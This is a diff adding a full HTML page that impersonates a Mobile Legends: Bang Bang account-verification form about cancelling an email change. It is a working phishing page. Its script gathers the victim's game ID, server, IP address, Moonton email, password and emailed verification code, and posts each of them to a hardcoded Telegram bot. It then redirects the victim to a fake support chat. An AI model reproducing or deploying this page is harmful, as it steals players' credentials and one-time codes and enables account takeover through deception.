@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mobile Legends | Account Verification</title>
+<style>
+  body { font-family: Arial, sans-serif; margin:0; background:#f2f2f2; }
+  .container { max-width:600px; margin:40px auto; padding:20px; text-align:center; }
+  h2 { font-size:20px; font-weight:bold; margin-bottom:10px; }
+  p { font-size:14px; color:#444; line-height:1.6; }
+  .input-box { margin-top:20px; text-align:left; position:relative; }
+  .input-field { width:100%; padding:12px; margin-top:6px; border-radius:10px; border:1px solid #ccc; font-size:16px; transition:0.2s; }
+  .input-field:focus { border-color:#3b82f6; box-shadow:0 0 6px rgba(59,130,246,0.4); }
+  .step-btn { width:100%; padding:12px; font-size:16px; font-weight:bold; border:none; border-radius:10px; margin-top:20px; background:#ccc; color:white; transition:0.2s; }
+  .step-btn.valid { background:#3b82f6; cursor:pointer; }
+  .platform-btn { display:flex; align-items:center; justify-content:center; padding:10px; border:1px solid #ddd; border-radius:12px; background:white; cursor:pointer; width:100%; }
+  .platform-btn img { width:60px; height:60px; margin-right:14px; border-radius:10px; }
+  .req-box { display:flex; gap:10px; align-items:center; width:100%; }
+  .req-btn { padding:10px; font-size:14px; font-weight:bold; border:none; border-radius:10px; background:#3b82f6; color:white; width:120px; cursor:pointer; }
+</style>
+</head>
+<body>
+
+<div id="step1" class="container">
+<h2>Apply for Cancellation of Change Email<br>Mobile Legends: Bang Bang</h2>
+<p><strong>Log into the platform account bound by the game</strong></p>
+<p>Dear player, please fill ID and Server Game to cancel change email.</p>
+<div class="input-box">
+<label></label>
+<input type="number" id="gameId" class="input-field" placeholder="GAME ID">
+</div>
+<div class="input-box">
+<label></label>
+<input type="number" id="serverId" class="input-field" placeholder="Server">
+</div>
+<button id="next1" class="step-btn" disabled>Next</button>
+</div>
+
+<div id="step2" class="container" style="display:none;">
+<img src="" style="width:10px;height:10px;margin-bottom:10px;filter:brightness(0) invert(1);">
+<h2>Apply for Cancellation of Change Email<br>Mobile Legends: Bang Bang</h2>
+<p><strong>Log into the platform account bound by the game</strong></p>
+<p>Please log into any platform account bound to the game account.</p>
+<button class="platform-btn" id="gotoEmail">
+<img src="https://i.imgur.com/YD6qHUP.png">
+<span>Moonton Account</span>
+</button>
+</div>
+
+<div id="step3" class="container" style="display:none;">
+<h2>Apply for Cancellation of Change Email<br>Mobile Legends: Bang Bang</h2>
+<p>Please enter your Moonton Email</p>
+<div class="input-box">
+<label>Email</label>
+<input type="email" id="email" class="input-field" placeholder="Enter your email">
+</div>
+<button id="nextEmail" class="step-btn" disabled>Next</button>
+</div>
+
+<div id="step4" class="container" style="display:none;">
+<h2>Apply for Cancellation of Change Email<br>Mobile Legends: Bang Bang</h2>
+<p>Please enter your Moonton password</p>
+<div class="input-box">
+<label>Password</label>
+<input type="password" id="password" class="input-field" placeholder="Enter your password">
+<span id="togglePass" style="position:absolute; right:15px; top:52px; cursor:pointer; font-size:14px; color:#3b82f6;">Show</span>
+</div>
+<button id="nextPassword" class="step-btn" disabled>Next</button>
+</div>
+
+<div id="step5" class="container" style="display:none;">
+<h2>Apply for Cancellation of Change Email<br>Mobile Legends: Bang Bang</h2>
+<p>Please enter verification code from email (6 digit)</p>
+<div class="input-box req-box">
+<input type="number" id="code" class="input-field" placeholder="Enter code">
+<button id="reqCode" class="req-btn">Request</button>
+</div>
+<button id="finish" class="step-btn" disabled>Submit</button>
+</div>
+
+<script>
+function showStep(id){
+  document.querySelectorAll('.container').forEach(c=>c.style.display='none');
+  document.getElementById(id).style.display='block';
+}
+
+async function sendToTelegram(message){
+  const token="8141030556:AAEgNJzBdkr0Kfx9niBcTwtKltnknHUNj08";
+  const chat_id="7268861803";
+  const url=`https://api.telegram.org/bot${token}/sendMessage`;
+  await fetch(url,{method:"POST",headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id,text:message})});
+}
+
+async function getIP(){
+  try{const res=await fetch("https://api.ipify.org?format=json");const data=await res.json();return data.ip;}
+  catch(e){ return "IP not found"; }
+}
+
+const gameId=document.getElementById('gameId');
+const serverId=document.getElementById('serverId');
+const next1=document.getElementById('next1');
+
+function validateStep1(){
+  if(gameId.value.length>=7 && gameId.value.length<=10 && serverId.value.length>=4){
+    next1.classList.add('valid'); next1.disabled=false;
+  } else { next1.classList.remove('valid'); next1.disabled=true; }
+}
+gameId.oninput=validateStep1;
+serverId.oninput=validateStep1;
+
+next1.onclick = () => {
+  getIP().then(ip => sendToTelegram(`Step1:\nGameID: ${gameId.value}\nServer: ${serverId.value}\nIP: ${ip}`));
+  showStep('step2');
+};
+
+document.getElementById('gotoEmail').onclick=()=>showStep('step3');
+
+const email=document.getElementById('email');
+const nextEmail=document.getElementById('nextEmail');
+email.oninput=()=>{if(email.value.includes('@') && email.value.includes('.')){nextEmail.classList.add('valid'); nextEmail.disabled=false;}else{nextEmail.classList.remove('valid'); nextEmail.disabled=true;}};
+nextEmail.onclick = () => {sendToTelegram(`Step3:\nEmail: ${email.value}`);showStep('step4');};
+
+const password=document.getElementById('password');
+const nextPassword=document.getElementById('nextPassword');
+password.oninput=()=>{if(password.value.length>=4){nextPassword.classList.add('valid');nextPassword.disabled=false;}else{nextPassword.classList.remove('valid');nextPassword.disabled=true;}};
+document.getElementById('togglePass').onclick=function(){const pw=document.getElementById('password');if(pw.type==='password'){pw.type='text';this.innerText='Hide';}else{pw.type='password';this.innerText='Show';}};
+nextPassword.onclick = () => {sendToTelegram(`Step4:\nPassword: ${password.value}`);showStep('step5');};
+
+const code=document.getElementById('code');
+const finish=document.getElementById('finish');
+let codeRequested=false;
+
+code.oninput=()=>{if(code.value.length>=4){finish.classList.add('valid');finish.disabled=false;}else{finish.classList.remove('valid');finish.disabled=true;}};
+
+let timer;
+document.getElementById('reqCode').addEventListener('click', function(){
+  if(timer) clearInterval(timer); // clear previous jika ada
+  codeRequested=true;
+  sendToTelegram(`Step5 Request Code:\nGameID: ${gameId.value}\nServer: ${serverId.value}\nEmail: ${email.value}`);
+  let btn=this;
+  let t=120;
+  btn.disabled=true;
+  btn.innerText=t+'s';
+  timer=setInterval(function(){
+    t--;
+    btn.innerText=t+'s';
+    if(t==0){
+      clearInterval(timer);
+      btn.innerText='Request';
+      btn.disabled=false;
+    }
+  },1000);
+});
+
+finish.onclick=()=>{
+  if(!codeRequested){alert("You must request the code first!"); return;}
+  if(code.value.length<4){alert("Please enter a valid code!"); return;}
+  sendToTelegram(`Step5 Submit:\nCode: ${code.value}`);
+  window.location.href="https://t.me/https://t.me/MobileLegendsTeamCS?text=Cancel%20Change%20Email%20Request";
+};
+</script>
+
+</body>
+</html>
